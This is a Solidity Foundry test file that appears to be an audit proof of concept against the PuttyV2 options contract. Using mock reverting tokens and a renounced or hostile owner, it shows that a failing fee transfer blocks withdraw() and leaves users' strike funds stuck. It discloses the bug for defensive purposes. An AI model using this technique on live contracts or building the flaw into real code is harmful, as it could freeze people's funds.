// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "solmate/tokens/ERC20.sol";

import "src/PuttyV2.sol";
import "../shared/Fixture.t.sol";

// Mock ERC20 that reverts on transfer to zero address (like OpenZeppelin ERC20)
contract RevertToZeroERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_, decimals_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    // Override transfer to revert on zero address like OpenZeppelin ERC20
    function transfer(address to, uint256 amount) public override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        return super.transfer(to, amount);
    }

    // Override transferFrom to revert on zero address like OpenZeppelin ERC20
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        return super.transferFrom(from, to, amount);
    }
}

// Mock ERC777 token that reverts when receiving tokens
contract RevertingERC777 is ERC20 {
    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_, decimals_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    // This simulates an ERC777 token that has a tokensReceived hook that always reverts
    // when the contract owner receives tokens
    function transfer(address to, uint256 amount) public override returns (bool) {
        bool success = super.transfer(to, amount);
        // Simulate revert if transferring to the contract owner (attacker controlled)
        if (to == address(0xdead)) { // Using 0xdead as example malicious owner
            revert("ERC777: tokensReceived hook reverted");
        }
        return success;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        bool success = super.transferFrom(from, to, amount);
        // Simulate revert if transferring to the contract owner (attacker controlled)
        if (to == address(0xdead)) { // Using 0xdead as example malicious owner
            revert("ERC777: tokensReceived hook reverted");
        }
        return success;
    }
}

contract ExploitTest is Fixture {
    event WithdrawOrder(bytes32 indexed orderHash, PuttyV2.Order order);

    RevertToZeroERC20 internal revertToZeroToken;
    RevertingERC777 internal revertingERC777;
    address[] internal floorTokens;
    PuttyV2.ERC20Asset[] internal erc20Assets;
    PuttyV2.ERC721Asset[] internal erc721Assets;
    uint256[] internal floorAssetTokenIds;

    receive() external payable {}

    function setUp() public {
        // Deploy our malicious tokens
        revertToZeroToken = new RevertToZeroERC20("Revert To Zero", "R2Z", 18);
        revertingERC777 = new RevertingERC777("Reverting ERC777", "R777", 18);

        // Mint tokens to test users
        revertToZeroToken.mint(address(this), 1000 ether);
        revertToZeroToken.mint(babe, 1000 ether);
        revertingERC777.mint(address(this), 1000 ether);
        revertingERC777.mint(babe, 1000 ether);

        // Approve tokens for Putty contract (will approve for specific instances in tests)
        revertToZeroToken.approve(address(p), type(uint256).max);
        revertingERC777.approve(address(p), type(uint256).max);

        vm.prank(babe);
        revertToZeroToken.approve(address(p), type(uint256).max);

        vm.prank(babe);
        revertingERC777.approve(address(p), type(uint256).max);
    }

    /// @notice Test Method #1: Owner set to zero address causing ERC20 transfer revert
    /// @dev This demonstrates how setting owner to zero address can block withdrawals
    function testWithdrawBlockedWhenOwnerIsZeroAddress() public {
        // Arrange: Create a Putty contract with a fee and set owner to zero address
        PuttyV2 maliciousPutty = new PuttyV2("https://testing.org/tokens/", 10, address(weth)); // 1% fee

        // Transfer ownership to zero address (vulnerability scenario)
        vm.prank(maliciousPutty.owner());
        maliciousPutty.renounceOwnership();

        // Approve tokens for this specific Putty instance
        revertToZeroToken.approve(address(maliciousPutty), type(uint256).max);
        vm.prank(babe);
        revertToZeroToken.approve(address(maliciousPutty), type(uint256).max);

        // Create an order with the revert-to-zero token
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: babe,
            isCall: false, // Put option
            isLong: false, // Short position
            baseAsset: address(revertToZeroToken),
            strike: 100 ether,
            premium: 5 ether,
            duration: 10 days,
            expiration: block.timestamp + 30 days,
            nonce: 1,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });

        // Sign and fill the order
        bytes32 digest = maliciousPutty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(babePrivateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Fill the order (babe is the short put, so she needs to deposit strike)
        vm.prank(babe);
        maliciousPutty.fillOrder(order, signature, floorAssetTokenIds);

        // Wait for the option to expire
        skip(order.duration + 1);

        // Act & Assert: Attempt to withdraw should fail due to fee transfer reverting
        vm.prank(babe);
        vm.expectRevert(); // Should revert when trying to transfer fee to zero address
        maliciousPutty.withdraw(order);
    }

    /// @notice Test Method #2: ERC777 token reverting on transfer to owner
    /// @dev This demonstrates how ERC777 tokens can block withdrawals by reverting on fee transfer
    function testWithdrawBlockedWhenERC777RevertsOnFeeTransfer() public {
        // Arrange: Create a Putty contract with a malicious owner that reverts on token receipt
        PuttyV2 maliciousPutty = new PuttyV2("https://testing.org/tokens/", 15, address(weth)); // 1.5% fee

        // Transfer ownership to a contract that reverts on token receipt (simulating ERC777 behavior)
        vm.prank(maliciousPutty.owner());
        maliciousPutty.transferOwnership(address(0xdead)); // 0xdead will be our "malicious" owner

        // Approve tokens for this specific Putty instance
        revertingERC777.approve(address(maliciousPutty), type(uint256).max);
        vm.prank(babe);
        revertingERC777.approve(address(maliciousPutty), type(uint256).max);

        // Create an order with the ERC777-like token
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: babe,
            isCall: false, // Put option
            isLong: false, // Short position
            baseAsset: address(revertingERC777),
            strike: 100 ether,
            premium: 5 ether,
            duration: 10 days,
            expiration: block.timestamp + 30 days,
            nonce: 2,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });

        // Sign and fill the order
        bytes32 digest = maliciousPutty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(babePrivateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Fill the order (babe is the short put, so she needs to deposit strike)
        vm.prank(babe);
        maliciousPutty.fillOrder(order, signature, floorAssetTokenIds);

        // Wait for the option to expire
        skip(order.duration + 1);

        // Act & Assert: Attempt to withdraw should fail due to ERC777 reverting on fee transfer
        vm.prank(babe);
        vm.expectRevert(); // Expect any revert due to fee transfer failure
        maliciousPutty.withdraw(order);
    }

    /// @notice Test that demonstrates the vulnerability impact: user funds are stuck
    /// @dev This shows that users cannot withdraw their strike amounts when fee transfer fails
    function testUserFundsStuckWhenFeeTransferFails() public {
        // Arrange: Set up scenario where fee transfer will fail
        PuttyV2 maliciousPutty = new PuttyV2("https://testing.org/tokens/", 20, address(weth)); // 2% fee

        // Set owner to zero address to cause fee transfer to revert
        vm.prank(maliciousPutty.owner());
        maliciousPutty.renounceOwnership();

        // Approve tokens for this specific Putty instance
        revertToZeroToken.approve(address(maliciousPutty), type(uint256).max);
        vm.prank(babe);
        revertToZeroToken.approve(address(maliciousPutty), type(uint256).max);

        PuttyV2.Order memory order = PuttyV2.Order({
            maker: babe,
            isCall: false, // Put option
            isLong: false, // Short position
            baseAsset: address(revertToZeroToken),
            strike: 50 ether,
            premium: 2 ether,
            duration: 10 days,
            expiration: block.timestamp + 30 days,
            nonce: 3,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });

        // Sign and fill the order
        bytes32 digest = maliciousPutty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(babePrivateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Record babe's balance before filling the order
        uint256 balanceBefore = revertToZeroToken.balanceOf(babe);

        // Fill the order (babe deposits 50 ether strike)
        vm.prank(babe);
        maliciousPutty.fillOrder(order, signature, floorAssetTokenIds);

        // Verify babe's balance decreased by the strike amount
        assertEq(
            balanceBefore - revertToZeroToken.balanceOf(babe),
            order.strike,
            "Babe's balance should decrease by strike amount"
        );

        // Wait for expiration
        skip(order.duration + 1);

        // Act & Assert: Babe cannot withdraw her 50 ether strike due to fee transfer failure
        vm.prank(babe);
        vm.expectRevert();
        maliciousPutty.withdraw(order);

        // Verify babe's funds are stuck - she cannot get her strike back
        assertEq(
            revertToZeroToken.balanceOf(babe),
            balanceBefore - order.strike,
            "Babe's funds should remain stuck in contract"
        );

        // Verify the contract still holds the strike amount
        assertEq(
            revertToZeroToken.balanceOf(address(maliciousPutty)),
            order.strike,
            "Contract should still hold the stuck strike amount"
        );
    }

    /// @notice Test that shows normal withdrawal works when fee transfer succeeds
    /// @dev This confirms the vulnerability only occurs when fee transfer fails
    function testNormalWithdrawalWorksWhenFeeTransferSucceeds() public {
        // Arrange: Use normal Putty contract with non-zero owner
        PuttyV2 normalPutty = new PuttyV2("https://testing.org/tokens/", 10, address(weth)); // 1% fee

        // Approve tokens for this specific Putty instance
        revertToZeroToken.approve(address(normalPutty), type(uint256).max);
        vm.prank(babe);
        revertToZeroToken.approve(address(normalPutty), type(uint256).max);

        PuttyV2.Order memory order = PuttyV2.Order({
            maker: babe,
            isCall: false, // Put option
            isLong: false, // Short position
            baseAsset: address(revertToZeroToken),
            strike: 100 ether,
            premium: 5 ether,
            duration: 10 days,
            expiration: block.timestamp + 30 days,
            nonce: 4,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });

        // Sign and fill the order
        bytes32 digest = normalPutty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(babePrivateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(babe);
        normalPutty.fillOrder(order, signature, floorAssetTokenIds);

        // Wait for expiration
        skip(order.duration + 1);

        // Record balances before withdrawal
        uint256 babeBalanceBefore = revertToZeroToken.balanceOf(babe);
        uint256 ownerBalanceBefore = revertToZeroToken.balanceOf(normalPutty.owner());

        // Act: Withdraw should succeed normally
        vm.prank(babe);
        normalPutty.withdraw(order);

        // Assert: Withdrawal succeeds with proper fee deduction
        uint256 expectedFee = (order.strike * 10) / 1000; // 1% fee
        uint256 expectedStrikeAfterFee = order.strike - expectedFee;

        assertEq(
            revertToZeroToken.balanceOf(babe) - babeBalanceBefore,
            expectedStrikeAfterFee,
            "Babe should receive strike minus fee"
        );

        assertEq(
            revertToZeroToken.balanceOf(normalPutty.owner()) - ownerBalanceBefore,
            expectedFee,
            "Owner should receive the fee"
        );
    }
}